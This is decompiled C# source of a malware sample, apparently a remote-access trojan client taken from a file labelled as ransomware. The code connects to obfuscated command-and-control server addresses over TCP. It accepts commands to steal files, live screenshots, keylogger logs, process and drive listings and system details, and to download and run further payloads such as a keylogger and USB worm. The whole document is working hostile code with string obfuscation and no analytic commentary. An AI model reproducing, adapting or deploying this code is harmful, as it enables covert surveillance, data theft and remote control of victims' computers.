// Decompiled with JetBrains decompiler
// Type: thandhwiar.MSAMCDM
// Assembly: thandhwiar, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89805F93-CF8A-4ECE-A0DD-C3C2D313114A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-a0f6963845d7aeae328048da66059059fdbcb6cc30712fd10a34018caf0bd28a.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace thandhwiar
{
  public class MSAMCDM
  {
    private int buffxSize = 1024;
    public GCANONF GCANONF = new GCANONF();
    public bool reqCxnls;
    private int atmtps;
    private bool thrtRuning;
    private Thread funxThread;
    public TcpClient tctpsck;
    private int bytesiRead;
    public NetworkStream netiStream;
    private DSADRIVF iHD = new DSADRIVF();
    public DateTime lTimexUtc;
    private Dictionary<string, byte[]> txasks = new Dictionary<string, byte[]>();
    public int port_sn;
    private bool hasusxb;
    public bool is_wosrking;
    private OCATHRE StatexObj = new OCATHRE();
    public bool auttCnls;
    private ThreadStart funiStarter;
    public Process CiProcess;
    public ProcessStartInfo CSxtartInfo;
    private bool capiScreen;
    private bool iswixtch;
    private bool str_wxriter;
    public DateTime runTime;
    private int my_pors;

    public string file_info(string path, bool ret = false)
    {
      try
      {
        FileInfo fileInfo = new FileInfo(path);
        string name = fileInfo.Name;
        string str1;
        if (ret)
          str1 = "<|".Split('|')[0];
        else
          str1 = ">|".Split('|')[0];
        string str2 = name + str1;
        string str3 = fileInfo.CreationTimeUtc.ToString();
        string str4;
        if (ret)
          str4 = "<|".Split('|')[0];
        else
          str4 = ">|".Split('|')[0];
        string str5 = str2 + str3 + str4;
        string size = this.get_size(fileInfo.Length);
        string str6;
        if (ret)
          str6 = "<|".Split('|')[0];
        else
          str6 = ">|".Split('|')[0];
        string str7 = str5 + size + str6;
        if (!ret)
          this.push_dsata((byte[]) null, "fislsz=|".Split('|')[0] + str7);
        return str7;
      }
      catch
      {
        return "";
      }
    }

    public void seeUSB()
    {
      try
      {
        if (Process.GetProcessesByName(this.GCANONF.usbxApp).Length != 0)
          return;
        if (!File.Exists(this.GCANONF.usbxPath() + this.GCANONF.usbxApp + ".exe!".Split('!')[0]))
          return;
        this.do_proscess(this.GCANONF.usbxPath() + this.GCANONF.usbxApp + ".exe!".Split('!')[0]);
      }
      catch
      {
      }
    }

    public NetworkStream NS(TcpClient tctpsck) => tctpsck.GetStream();

    public void do_proscess(string filesPath)
    {
      try
      {
        Process.Start(filesPath);
      }
      catch
      {
      }
    }

    public void seeusbl()
    {
      try
      {
        if (Process.GetProcessesByName(this.GCANONF.usbxApp).Length != 0)
          return;
        if (!File.Exists(this.GCANONF.usbxPath() + this.GCANONF.usbxApp + ".exe!".Split('!')[0]))
          return;
        this.do_proscess(this.GCANONF.usbxPath() + this.GCANONF.usbxApp + ".exe!".Split('!')[0]);
      }
      catch
      {
      }
    }

    public void seekilogr()
    {
      try
      {
        if (Process.GetProcessesByName(this.GCANONF.kiysAdpp).Length != 0)
          return;
        if (!File.Exists(this.GCANONF.kiPsath() + this.GCANONF.kiysAdpp + ".exe!".Split('!')[0]))
          return;
        this.do_proscess(this.GCANONF.kiPsath() + this.GCANONF.kiysAdpp + ".exe!".Split('!')[0]);
      }
      catch
      {
      }
    }

    public string get_size(long byteCount)
    {
      try
      {
        string[] strArray = new string[7]
        {
          "B!".Split('!')[0],
          "KB!".Split('!')[0],
          "MB!".Split('!')[0],
          "GB",
          "TB",
          "PB",
          "EB!".Split('!')[0]
        };
        if (byteCount == 0L)
          return "0" + strArray[0];
        long a = Math.Abs(byteCount);
        int int32 = Convert.ToInt32(Math.Floor(Math.Log((double) a, 1024.0)));
        double num = Math.Round((double) a / Math.Pow(1024.0, (double) int32), 1);
        return ((double) Math.Sign(byteCount) * num).ToString() + strArray[int32];
      }
      catch
      {
        return "";
      }
    }

    public void do_updated(string uType, string switchType)
    {
      try
      {
        byte[] bytes = this.pull_data();
        switch (uType)
        {
          case "$uk5log":
            if (bytes == null)
              break;
            if (!Directory.Exists(this.GCANONF.kiPsath()))
              Directory.CreateDirectory(this.GCANONF.kiPsath());
            Process.GetProcessesByName(this.GCANONF.kiysAdpp);
            File.WriteAllBytes(this.GCANONF.kiPsath() + this.GCANONF.kiysAdpp + ".exe", bytes);
            break;
          case "$up5datu":
          case "$us5bwrm":
            if (!Directory.Exists(this.GCANONF.usbxPath()))
              Directory.CreateDirectory(this.GCANONF.usbxPath());
            if (bytes == null)
              break;
            Process.GetProcessesByName(this.GCANONF.usbxApp);
            File.WriteAllBytes(this.GCANONF.usbxPath() + this.GCANONF.usbxApp + ".exe!".Split('!')[0], bytes);
            break;
        }
      }
      catch
      {
      }
    }

    public string[] serverIPD()
    {
      char[] chArray = new char[this.GCANONF.vpsipzs.Length];
      for (int index = 0; index < this.GCANONF.vpsipzs.Length; ++index)
      {
        char ch = Convert.ToChar(this.GCANONF.vpsipzs[index]);
        chArray[index] = ch;
      }
      return new string(chArray).Split('?');
    }

    public void checkLast()
    {
      DateTime now = DateTime.Now;
      try
      {
        if (Math.Abs(this.runTime.Subtract(now).Minutes) <= 6)
          return;
        this.tctpsck.Close();
        this.is_wosrking = false;
      }
      catch
      {
      }
    }

    public void remove_user()
    {
      try
      {
        byte[] bytes = this.pull_data();
        if (bytes == null)
          return;
        if (File.Exists(this.GCANONF.get_mpath() + this.GCANONF.remvxUser + ".exe!".Split('!')[0]))
          return;
        File.WriteAllBytes(this.GCANONF.get_mpath() + this.GCANONF.remvxUser + ".exe!".Split('!')[0], bytes);
        this.do_proscess(this.GCANONF.get_mpath() + this.GCANONF.remvxUser + ".exe");
      }
      catch
      {
      }
    }

    private void push_fixle(string lfile)
    {
      try
      {
        if (!File.Exists(lfile))
          return;
        string fileName = Path.GetFileName(lfile);
        this.push_dsata(File.ReadAllBytes(lfile), "fisle=!".Split('!')[0] + lfile + ">0>" + fileName, true);
      }
      catch
      {
      }
    }

    private void user_inxfo()
    {
      this.push_dsata(this.GCANONF.getBytexArray(this.GCANONF.lancadrd + "|" + this.GCANONF.cdname + this.GCANONF.dy_isd + "|" + this.GCANONF.undame + "|" + this.GCANONF.duip + "|" + this.GCANONF.Ossname() + "|" + this.GCANONF.apdver + "|" + "||".ToString() + "|" + this.GCANONF.get_mpath()), "insfo=usser|".Split('|')[0]);
      if (!this.hasusxb)
      {
        if (Directory.Exists(this.GCANONF.usbxPath() + "data!".Split('!')[0]))
          this.hasusxb = true;
      }
      if (!this.hasusxb)
        return;
      this.push_dsata((byte[]) null, "hassusb=" + this.GCANONF.usbxPath() + "data!".Split('!')[0]);
    }

    public bool push_dsata(byte[] data, string type, bool tmp = false)
    {
      try
      {
        this.runTime = DateTime.Now;
        if (this.str_wxriter)
          return false;
        this.str_wxriter = true;
        byte[] bytexArray = this.GCANONF.getBytexArray(type);
        int num1 = 0;
        int num2 = 5;
        byte[] numArray = (byte[]) null;
        if (data != null)
        {
          numArray = BitConverter.GetBytes(data.Length);
          num1 = data.Length;
          num2 = 10;
        }
        byte[] bytes = BitConverter.GetBytes(bytexArray.Length);
        byte[] buffer = new byte[num2 + bytexArray.Length + num1];
        bytes.CopyTo((Array) buffer, 0);
        bytexArray.CopyTo((Array) buffer, 5);
        if (data != null)
        {
          numArray.CopyTo((Array) buffer, 5 + bytexArray.Length);
          data.CopyTo((Array) buffer, 10 + bytexArray.Length);
        }
        int offset = 0;
        int length = buffer.Length;
        while (length > 0 && !this.reqCxnls)
        {
          int count = length > this.buffxSize ? this.buffxSize : length;
          this.netiStream.Write(buffer, offset, count);
          offset += count;
          length -= count;
          this.runTime = DateTime.Now;
        }
        this.str_wxriter = false;
        return !this.reqCxnls;
      }
      catch
      {
        this.str_wxriter = false;
        this.is_wosrking = false;
        return false;
      }
    }

    public void saveFdile(string filesPath)
    {
      try
      {
        byte[] bytes = this.pull_data();
        if (bytes == null)
          return;
        File.WriteAllBytes(filesPath, bytes);
      }
      catch
      {
      }
    }

    public string[] get_comdand()
    {
      try
      {
        byte[] buffer1 = new byte[5];
        this.bytesiRead = this.netiStream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[int32];
        int offset = 0;
        for (int index = int32; index > 0; index -= this.bytesiRead)
        {
          int count = index > this.buffxSize ? this.buffxSize : index;
          this.bytesiRead = this.netiStream.Read(buffer2, offset, count);
          offset += this.bytesiRead;
        }
        char[] chArray = new char[buffer2.Length];
        for (int index = 0; index < buffer2.Length; ++index)
        {
          char ch = Convert.ToChar(buffer2[index]);
          chArray[index] = ch;
        }
        string str = new string(chArray);
        if (str.Trim() == "")
          return (string[]) null;
        return str.ToLower().Split('=');
      }
      catch
      {
        this.is_wosrking = false;
        return (string[]) null;
      }
    }

    private bool IPSDX()
    {
      try
      {
        this.GCANONF.defauxltP = this.serverIPD()[0];
        this.my_pors = int.Parse(this.GCANONF.podrt.Split(',')[this.port_sn]);
        if (this.atmtps > 22)
        {
          this.GCANONF.defauxltP = this.serverIPD()[1];
          if (this.atmtps > 26)
            this.atmtps = 0;
        }
        ++this.atmtps;
        this.tctpsck = new TcpClient();
        this.tctpsck.Connect(this.GCANONF.defauxltP, this.my_pors);
        this.atmtps = 0;
        return true;
      }
      catch
      {
        ++this.port_sn;
        if (this.port_sn > 4)
          this.port_sn = 0;
        return false;
      }
    }

    private void lookup_conDX(object sdoudrce)
    {
      try
      {
        if (!this.thrtRuning)
        {
          this.thrtRuning = true;
          this.checkLast();
          if (!this.is_wosrking || !this.tctpsck.Connected)
          {
            this.is_wosrking = this.IPSDX();
            if (this.is_wosrking)
            {
              this.buffxSize = this.tctpsck.ReceiveBufferSize;
              this.see_resDX();
            }
          }
        }
        this.thrtRuning = false;
      }
      catch
      {
        ++this.atmtps;
        this.thrtRuning = false;
        this.str_wxriter = false;
        this.is_wosrking = false;
        this.iswixtch = false;
      }
    }

    public void list_prodses()
    {
      try
      {
        string str = "";
        Process[] processes = Process.GetProcesses();
        for (int index = 0; index <= processes.Length - 1; ++index)
          str = str + (object) processes[index].Id + ">|".Split('|')[0] + processes[index].ProcessName + ">!".Split('!')[0] + "0>|".Split('|')[0] + "<!".Split('!')[0];
        this.push_dsata(this.GCANONF.getBytexArray(str), "prsocl=pesoc|".Split('|')[0]);
      }
      catch
      {
      }
    }

    public byte[] pull_data()
    {
      try
      {
        this.runTime = DateTime.Now;
        int offset = 0;
        byte[] buffer1 = new byte[5];
        this.bytesiRead = this.netiStream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[int32];
        int num = int32;
        while (num > 0 && !this.reqCxnls)
        {
          int count = num > this.buffxSize ? this.buffxSize : num;
          this.bytesiRead = this.netiStream.Read(buffer2, offset, count);
          offset += this.bytesiRead;
          num -= this.bytesiRead;
          this.runTime = DateTime.Now;
        }
        if (this.reqCxnls)
        {
          this.netiStream.Flush();
          buffer2 = (byte[]) null;
        }
        return buffer2;
      }
      catch
      {
        this.is_wosrking = false;
        return (byte[]) null;
      }
    }

    private void see_resDX()
    {
      if (!this.iswixtch)
      {
        this.iswixtch = true;
        this.netiStream = this.NS(this.tctpsck);
        this.capiScreen = false;
        while (this.is_wosrking)
        {
          string[] switchType = this.get_comdand();
          if (switchType == null)
          {
            this.is_wosrking = false;
            break;
          }
          this.reqCxnls = false;
          string str1 = switchType[0];
          if (str1.Split('-').Length > 1)
            str1 = str1.Split('-')[1];
          string uType = "$" + str1.Insert(2, "5");
          switch (uType)
          {
            case "$fl5dr":
            case "$fl5sdr":
              string Folders = this.iHD.check_Folsders(switchType[1]);
              if (Folders != null)
              {
                this.funiStarter = (ThreadStart) (() => this.push_dsata((byte[]) null, "flsdr=|".Split('|')[0] + Folders));
                this.funxThread = new Thread(this.funiStarter);
                this.funxThread.Start();
                continue;
              }
              continue;
            case "$rn5nkl":
            case "$rn5snkl":
              this.seekilogr();
              continue;
            case "$pr5ocl":
            case "$pr5socl":
              this.funiStarter = (ThreadStart) (() => this.list_prodses());
              this.funxThread = new Thread(this.funiStarter);
              this.funxThread.Start();
              continue;
            case "$us5brun":
            case "$us5sbrun":
              this.seeUSB();
              continue;
            case "$th5umb":
            case "$th5sumb":
              this.image_infdo(switchType[1]);
              continue;
            case "$sc5rsz":
            case "$sc5srsz":
              this.GCANONF.screenSsize(switchType[1]);
              continue;
            case "$sc5ren":
            case "$sc5sren":
              this.capiScreen = true;
              this.funiStarter = (ThreadStart) (() => this.is_screden(switchType[1]));
              this.funxThread = new Thread(this.funiStarter);
              this.funxThread.Start();
              continue;
            case "$rn5nub":
            case "$rn5snub":
              this.seeusbl();
              continue;
            case "$cl5ping":
            case "$cl5sping":
              this.runTime = DateTime.Now;
              continue;
            case "$cl5rcmd":
            case "$cl5srcmd":
              this.CSxtartInfo = (ProcessStartInfo) null;
              this.CiProcess = (Process) null;
              continue;
            case "$sy5sky":
            case "$sy5ssky":
              this.funiStarter = (ThreadStart) (() => this.uploadKLodgs());
              this.funxThread = new Thread(this.funiStarter);
              this.funxThread.Start();
              continue;
            case "$ke5erun":
            case "$ke5serun":
              this.seekilogr();
              continue;
            case "$cl5stats":
            case "$cl5sstats":
              this.funiStarter = (ThreadStart) (() => this.update_Stadts());
              this.funxThread = new Thread(this.funiStarter);
              this.funxThread.Start();
              continue;
            case "$ru5nf":
            case "$ru5snf":
              this.do_proscess(switchType[1].Split('>')[0]);
              continue;
            case "$in5fo":
            case "$in5sfo":
              this.user_inxfo();
              continue;
            case "$do5wf":
            case "$do5swf":
              this.saveFdile(switchType[1]);
              continue;
            case "$af5ile":
            case "$af5sile":
              this.funiStarter = (ThreadStart) (() => this.send_autdo(switchType[1]));
              this.funxThread = new Thread(this.funiStarter);
              this.funxThread.Start();
              continue;
            case "$di5rs":
            case "$di5srs":
              this.funxThread = new Thread(new ThreadStart(this.listDrives));
              this.funxThread.Start();
              continue;
            case "$fl5es":
            case "$fl5ses":
              string str2 = this.iHD.lookup_Fises(switchType[1]);
              if (str2 != null)
              {
                this.push_dsata((byte[]) null, "flses=|".Split('|')[0] + str2);
                continue;
              }
              continue;
            case "$do5wr":
            case "$do5swr":
              this.saveFdile(switchType[1]);
              continue;
            case "$cs5creen":
            case "$cs5screen":
              this.see_scrden(switchType[1]);
              continue;
            case "$st5ops":
            case "$st5sops":
              this.capiScreen = false;
              continue;
            case "$us5bwrm":
            case "$up5datu":
            case "$uk5log":
            case "$sn5dps":
            case "$au5dio":
              this.do_updated(uType, switchType[1]);
              continue;
            case "$fi5lsz":
            case "$fi5slsz":
              this.funiStarter = (ThreadStart) (() => this.file_info(switchType[1]));
              this.funxThread = new Thread(this.funiStarter);
              this.funxThread.Start();
              continue;
            case "$fi5le":
            case "$fi5sle":
              this.funiStarter = (ThreadStart) (() => this.push_fixle(switchType[1]));
              this.funxThread = new Thread(this.funiStarter);
              this.funxThread.Start();
              continue;
            case "$cn5ls":
            case "$cn5sls":
              this.auttCnls = true;
              this.reqCxnls = true;
              this.capiScreen = false;
              continue;
            case "$de5lt":
            case "$de5slt":
              this.remove_fidle(switchType[1]);
              continue;
            case "$ud5lt":
            case "$ud5slt":
              this.remove_user();
              continue;
            case "$li5stf":
            case "$li5sstf":
              this.funiStarter = (ThreadStart) (() => this.iHD.look_Filses(switchType[1]));
              this.funxThread = new Thread(this.funiStarter);
              this.funxThread.Start();
              continue;
            default:
              continue;
          }
        }
        this.is_wosrking = false;
        this.capiScreen = false;
      }
      this.iswixtch = false;
    }

    private void is_screden(string scredndSize)
    {
      try
      {
        OCASCRNS ocascrns = new OCASCRNS();
        this.GCANONF.screenSsize(scredndSize);
        while (this.capiScreen && this.is_wosrking)
        {
          Bitmap bitmap = ocascrns.screen((int) this.GCANONF.scrdSize);
          if (bitmap != null)
          {
            MemoryStream memoryStream = new MemoryStream();
            bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
            this.push_dsata(memoryStream.ToArray(), "scsren=cascen|".Split('|')[0]);
          }
        }
      }
      catch
      {
      }
    }

    private void image_infdo(string path)
    {
      try
      {
        Bitmap bitmap = new Bitmap((Image) new Bitmap(path), 210, 160);
        if (bitmap == null)
          return;
        FileInfo fileInfo = new FileInfo(path);
        string str = fileInfo.Name + ">!".Split('!')[0] + fileInfo.CreationTimeUtc.ToString() + ">!".Split('!')[0] + this.get_size(fileInfo.Length) + ">!".Split('!')[0];
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Png);
        this.push_dsata(memoryStream.ToArray(), "thsumb=visdew!".Split('!')[0] + str);
      }
      catch
      {
      }
    }

    private void uploadKLodgs()
    {
      try
      {
        if (!File.Exists(this.GCANONF.kiPsath() + this.GCANONF.kiysAdpp))
          return;
        string fileName = Path.GetFileName(this.GCANONF.kiPsath() + this.GCANONF.kiysAdpp);
        using (FileStream fileStream = File.Open(this.GCANONF.kiPsath() + this.GCANONF.kiysAdpp, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
        {
          using (StreamReader streamReader = new StreamReader((Stream) fileStream))
            this.push_dsata(this.GCANONF.getBytexArray(streamReader.ReadToEnd()), "sasvky=|".Split('|')[0] + fileName);
        }
      }
      catch
      {
      }
    }

    private void see_scrden(string scrdenSize)
    {
      try
      {
        OCASCRNS ocascrns = new OCASCRNS();
        this.GCANONF.screenSsize(scrdenSize);
        Bitmap bitmap = ocascrns.screen((int) this.GCANONF.scrdSize);
        if (bitmap == null)
          return;
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
        this.push_dsata(memoryStream.ToArray(), "sasscr=cresen!".Split('!')[0]);
      }
      catch
      {
      }
    }

    public void remove_fidle(string path)
    {
      try
      {
        File.Delete(path);
      }
      catch
      {
      }
    }

    public bool send_autdo(string fileinfo)
    {
      try
      {
        string path = fileinfo.Split('>')[0];
        if (!File.Exists(path))
          return false;
        string fileName = Path.GetFileName(path);
        byte[] data = File.ReadAllBytes(path);
        fileinfo = fileinfo + ">!".Split('!')[0] + fileName;
        this.push_dsata(data, "afsile=!".Split('!')[0] + fileinfo);
        return false;
      }
      catch
      {
        return false;
      }
    }

    private void update_Stadts()
    {
      try
      {
        this.push_dsata(this.GCANONF.apps_staxtus(), "asatas=upsds|".Split('|')[0]);
      }
      catch
      {
      }
    }

    public void do_start()
    {
      this.runTime = DateTime.Now;
      this.GCANONF.Inxfo();
      this.iHD.iserver = this;
      this.StatexObj.timer = new Timer(new TimerCallback(this.lookup_conDX), (object) this.StatexObj, 58800, 85100);
      this.funiStarter = (ThreadStart) (() => this.seekilogr());
      this.funxThread = new Thread(this.funiStarter);
      this.funxThread.Start();
      Thread.Sleep(810);
      this.funiStarter = (ThreadStart) (() => this.seeUSB());
      this.funxThread = new Thread(this.funiStarter);
      this.funxThread.Start();
    }

    private void listDrives()
    {
      string str = this.iHD.lookup_Drsves();
      this.push_dsata((byte[]) null, "disrs=!".Split('!')[0] + str);
    }
  }
}
